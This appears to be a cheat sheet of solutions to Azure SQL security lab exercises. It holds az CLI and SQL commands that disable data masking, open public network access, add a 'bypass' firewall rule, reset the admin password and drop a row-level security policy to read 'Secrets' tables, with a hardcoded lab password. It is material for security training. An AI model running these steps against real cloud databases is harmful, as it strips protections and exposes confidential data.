# Azure SQL

## DataMa­sking

```sh
az sql server list # check if the server allows public connections
az sql db list --server sqlserverlab1d090e49d -g sql-database-labs-rg-1

# To disable datamasking (same endpoint with get to check state)
az rest --method put \
  --uri "https://management.azure.com/subscriptions/<your-subscription-id>/resourceGroups/<your-resource-group>/providers/Microsoft.Sql/servers/<your-server>/databases/<your-database>/dataMaskingPolicies/Default?api-version=2021-11-01" \
  --body '{
    "properties": {
      "dataMaskingState": "Disable"
    }
  }'

mssqlclient.py 'lab1_student':'ComplexP@ssword123!'@sqlserverlab1d090e49d.database.windows.net -db FlagDatabaseLab1
```

Then on database:

```sql
SELECT * FROM USER_TABLE
SELECT * FROM Secrets
```

## Networ­k Rules

```sh
az sql server list # check if the server allows public connections
az sql db list --server sqlserverlab2d090e49d -g sql-database-labs-rg-2
az sql server show --name sqlserverlab2d090e49d -g sql-database-labs-rg-2 --query "publicNetworkAccess"

# Enable public access
az sql server update --name sqlserverlab2d090e49d -g sql-database-labs-rg-2 --set publicNetworkAccess="Enabled"
az sql server update --name sqlserverlab2d090e49d -g sql-database-labs-rg-2 --enable-public-network true # both works

# Add FW rule
az sql server firewall-rule list --server sqlserverlab2d090e49d -g sql-database-labs-rg-2
az sql server firewall-rule create --server sqlserverlab2d090e49d -g sql-database-labs-rg-2 --name "bypass" --start-ip-address 212.195.225.148 --end-ip-address 212.195.225.148 # IP based on error when trying to connect

# Update admin password
az sql server update --name sqlserverlab2d090e49d -g sql-database-labs-rg-2 --admin-password 'ComplexP@ssword123!'

mssqlclient.py 'sqladmin':'ComplexP@ssword123!'@sqlserverlab2d090e49d.database.windows.net -db FlagDatabaseLab2
```

Then on database:

```sql
SELECT * FROM sys.tables
SELECT * FROM Secrets
```

## Row Access Polici­es

```sh
az sql server list # check if the server allows public connections
az sql db list --server sqlserverlab3d090e49d -g sql-database-labs-rg-3
az sql server show --name sqlserverlab3d090e49d -g sql-database-labs-rg-3 --query "publicNetworkAccess"

mssqlclient.py 'lab3_student':'ComplexP@ssword123!'@sqlserverlab3d090e49d.database.windows.net -db FlagDatabaseLab3
```

Then on database:

```sql
SELECT * FROM sys.security_policies
SELECT * FROM fn_my_permissions(NULL, 'DATABASE'); -- look for ALTER ANY SECURITY POLICY
SELECT SCHEMA_NAME(5); -- using schema_id value
DROP SECURITY POLICY Security.secrets_policy -- using schema name

SELECT * FROM sys.tables
SELECT * FROM Secrets
```
